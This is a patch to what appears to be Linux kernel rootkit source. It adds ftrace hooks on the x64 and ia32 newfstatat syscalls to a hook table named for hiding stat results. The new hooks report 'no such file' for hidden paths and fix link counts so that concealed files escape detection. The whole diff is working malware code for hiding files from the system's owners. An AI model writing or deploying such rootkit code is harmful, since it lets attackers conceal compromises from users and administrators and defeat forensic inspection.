@@ -361,6 +361,48 @@ static notrace asmlinkage long hooked_sys_getpriority(const struct pt_regs *regs
     return real_sys_getpriority(regs);
 }
 
+static asmlinkage long (*real_sys_newfstatat)(const struct pt_regs *);
+
+static notrace asmlinkage long hooked_sys_newfstatat(const struct pt_regs *regs)
+{
+    int dfd = regs->di;
+    const char __user *pathname = (const char __user *)regs->si;
+    long ret;
+
+    if (should_hide_path(pathname))
+        return -ENOENT;
+
+    ret = real_sys_newfstatat(regs);
+    if (ret != 0)
+        return ret;
+
+#if defined(CONFIG_X86_64)
+    adjust_user_stat_nlink(pathname, (void __user *)regs->dx, sizeof(struct stat), false);
+#else
+    adjust_user_stat_nlink(pathname, (void __user *)regs->bx, sizeof(struct stat), false);
+#endif
+
+    return ret;
+}
+
+static asmlinkage long (*real_sys_newfstatat32)(const struct pt_regs *);
+
+static notrace asmlinkage long hooked_sys_newfstatat32(const struct pt_regs *regs)
+{
+    const char __user *pathname = (const char __user *)regs->cx;
+    long ret;
+
+    if (should_hide_path(pathname))
+        return -ENOENT;
+
+    ret = real_sys_newfstatat32(regs);
+    if (ret != 0)
+        return ret;
+
+    adjust_user_stat_nlink(pathname, (void __user *)regs->dx, sizeof(struct stat), false);
+
+    return ret;
+}
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_statx",       hooked_sys_statx,       &real_sys_statx),
@@ -375,6 +417,8 @@ static struct ftrace_hook hooks[] = {
     HOOK("__ia32_sys_newlstat",   hooked_sys_newlstat32,  &real_sys_newlstat32),
     HOOK("__x64_sys_getpriority",  hooked_sys_getpriority, &real_sys_getpriority),
     HOOK("__ia32_sys_getpriority", hooked_sys_getpriority, &real_sys_getpriority32),
+    HOOK("__x64_sys_newfstatat", hooked_sys_newfstatat, &real_sys_newfstatat),
+    HOOK("__ia32_sys_newfstatat", hooked_sys_newfstatat32, &real_sys_newfstatat32),
 };
 
 notrace int hiding_stat_init(void)
